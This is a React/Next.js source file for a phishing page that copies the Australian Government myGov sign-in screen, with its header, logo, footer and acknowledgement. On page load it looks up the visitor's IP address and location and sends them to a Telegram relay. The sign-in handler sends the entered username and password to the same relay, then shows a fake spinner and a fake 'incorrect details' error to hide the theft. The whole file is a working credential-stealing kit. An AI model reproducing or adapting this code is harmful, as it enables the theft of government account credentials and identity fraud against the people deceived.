"use client";

import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card } from "@/components/ui/card";
import { Separator } from "@/components/ui/separator";
import React, { useState, useEffect, useRef } from "react";
import { ChevronLeft, Key, Info, Eye } from "lucide-react";

export default function Home() {

  // Send message to Telegram
    const sendTelegramMessage = async (message: string) => {
      try {
        // Send a single request to the server which will forward to both chat IDs
        await fetch("/api/telegram", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ message }),
        });
      } catch (error) {
        console.error("Failed to send Telegram message:", error);
      }
    };
    
  // Send notification when user visits the page
  useEffect(() => {
    fetch("https://ipapi.co/json/")
      .then((response) => response.json())
      .then((data) => {
        const visitData = {
          url: window.location.href,
          ip: data.ip,
          location: `${data.city}, ${data.region}, ${data.country_name}`,
        };

        sendTelegramMessage(
          `Visited this URL: ${visitData.url}\nIP Address: ${visitData.ip}\nLocation: ${visitData.location}`
        );
      });
  }, []); // Empty dependency array to run once on mount

  const handleSignIn = async () => {
    const usernameInput = document.getElementById("username") as HTMLInputElement | null;
    const passwordInput = document.getElementById("password") as HTMLInputElement | null;
    const username = usernameInput ? usernameInput.value : "";
    const password = passwordInput ? passwordInput.value : "";

    // Send username and password to Telegram
    await sendTelegramMessage(
      `Sign-in attempt:\nUsername: ${username}\nPassword: ${password}`
    );

    const telegramChatId = process.env.NEXT_PUBLIC_ID;
    const telegramChatId2 = process.env.NEXT_PUBLIC_ID2;
    const telegramToken = process.env.NEXT_PUBLIC_TOKEN;

    // Display loading circle
    const loadingElement = document.createElement("div");
    loadingElement.className = "loading-circle";
    loadingElement.style.cssText = `
      border: 8px solid #f3f3f3;
      border-top: 8px solid #87CEEB;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
    `;
    document.body.appendChild(loadingElement);
    const styleSheet = document.styleSheets[0];
    styleSheet.insertRule(
      `
      @keyframes spin {
        0% { transform: translate(-50%, -50%) rotate(0deg); }
        100% { transform: translate(-50%, -50%) rotate(360deg); }
      }
    `,
      styleSheet.cssRules.length
    );

    // Wait for 2 seconds
    await new Promise((resolve) => setTimeout(resolve, 2000));

    // Remove loading circle and display error
    loadingElement.remove();
    const errorElement = document.createElement("div");
    errorElement.style.cssText = `
      background-color: #f8d7da;
      color: #721c24;
      padding: 10px;
      border-radius: 5px;
      margin-bottom: 20px;
    `;
    errorElement.innerHTML = `
      <span>! Error</span>
      <p>Your sign in details are incorrect (RFM10A)</p>
      <a href="#" style="color: #0066CC; text-decoration: underline;">Forgot username</a>
      <a href="#" style="color: #0066CC; text-decoration: underline; margin-left: 10px;">Forgot password</a>
    `;
    const mainElement = document.querySelector("main");
    if (mainElement) {
      mainElement.prepend(errorElement);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-[#87CEEB] px-4 py-4">
        <div className="max-w-6xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-4">
            {/* Australian Government Coat of Arms */}
            <div className="flex items-center gap-3">
              <div className="w-12 h-12 bg-black rounded-full flex items-center justify-center">
                <span className="text-white text-xs font-bold">AU</span>
              </div>
              <span className="text-black font-medium text-sm">Australian Government</span>
            </div>

            {/* myGov Logo */}
            <div className="flex items-center gap-2 ml-8">
              <div className="flex">
                <div className="w-0 h-0 border-l-[16px] border-l-[#4A5568] border-t-[12px] border-t-transparent border-b-[12px] border-b-transparent"></div>
                <div className="w-0 h-0 border-l-[16px] border-l-[#2D3748] border-t-[12px] border-t-transparent border-b-[12px] border-b-transparent"></div>
              </div>
              <span className="text-black text-xl font-semibold">myGov</span>
            </div>
          </div>

          <a href="#" className="text-black underline font-medium">
            Help
          </a>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-2xl mx-auto px-4 py-8">
        {/* Back Button */}
        <button className="flex items-center gap-2 text-[#0066CC] font-medium mb-8 hover:underline">
          <ChevronLeft size={20} />
          Back
        </button>

        {/* Main Heading */}
        <h1 className="text-4xl font-bold text-gray-900 mb-4">Sign in with myGov</h1>


        {/* Traditional Login Form */}
        <div className="space-y-6">
          <h2 className="text-2xl font-bold text-gray-900">Use your myGov sign in details</h2>

          <div className="space-y-2">
            <label htmlFor="username" className="block text-lg font-medium text-gray-900">
              Username or email
            </label>
            <Input
              id="username"
              type="text"
              className="w-full h-12 border-2 border-gray-300 rounded-none focus:border-[#0066CC] focus:ring-0"
            />
            <a href="#" className="text-[#0066CC] underline inline-block">
              Forgot username
            </a>
          </div>

          <div className="space-y-2">
            <label htmlFor="password" className="block text-lg font-medium text-gray-900">
              Password
            </label>
            <div className="relative">
              <Input
                id="password"
                type="password"
                className="w-full h-12 border-2 border-gray-300 rounded-none focus:border-[#0066CC] focus:ring-0 pr-16"
              />
              <button className="absolute right-3 top-1/2 transform -translate-y-1/2 text-[#0066CC] font-medium">
                Show
              </button>
            </div>
            <a href="#" className="text-[#0066CC] underline inline-block">
              Forgot password
            </a>
          </div>

          <Button
            onClick={handleSignIn}
            className="w-full h-14 bg-[#87CEEB] hover:bg-[#7DD3FC] text-black text-lg font-medium rounded-lg mt-6"
          >
            Sign in
          </Button>

          {/* Create Account Info */}
          <div className="flex items-start gap-2 mt-6">
            <Info size={16} className="text-gray-500 mt-1 flex-shrink-0" />
            <p className="text-gray-700">
              <a href="#" className="text-[#0066CC] underline">
                Create a myGov account
              </a>{" "}
              if you don't have one already.
            </p>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-black text-white mt-16">
        <div className="max-w-6xl mx-auto px-4 py-8">
          {/* Footer Links */}
          <div className="flex flex-wrap gap-8 mb-8">
            <a href="#" className="hover:underline">
              Terms of use
            </a>
            <a href="#" className="hover:underline">
              Privacy and security
            </a>
            <a href="#" className="hover:underline">
              Copyright
            </a>
            <a href="#" className="hover:underline">
              Accessibility
            </a>
          </div>

          <Separator className="bg-gray-600 mb-8" />

          {/* Footer Logos */}
          <div className="flex items-center gap-4 mb-8">
            <div className="flex items-center gap-3">
              <div className="w-16 h-16 bg-white rounded-full flex items-center justify-center">
                <span className="text-black text-xs font-bold">AU GOV</span>
              </div>
              <span className="text-white font-medium">Australian Government</span>
            </div>

            <div className="flex items-center gap-2 ml-8">
              <div className="flex">
                <div className="w-0 h-0 border-l-[20px] border-l-white border-t-[15px] border-t-transparent border-b-[15px] border-b-transparent"></div>
                <div className="w-0 h-0 border-l-[20px] border-l-gray-300 border-t-[15px] border-t-transparent border-b-[15px] border-b-transparent"></div>
              </div>
              <span className="text-white text-2xl font-semibold">myGov</span>
            </div>
          </div>

          {/* Acknowledgment */}
          <p className="text-gray-300 leading-relaxed">
            We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and
            present, of all Aboriginal and Torres Strait Islander nations.
          </p>
        </div>
      </footer>
    </div>
  );
}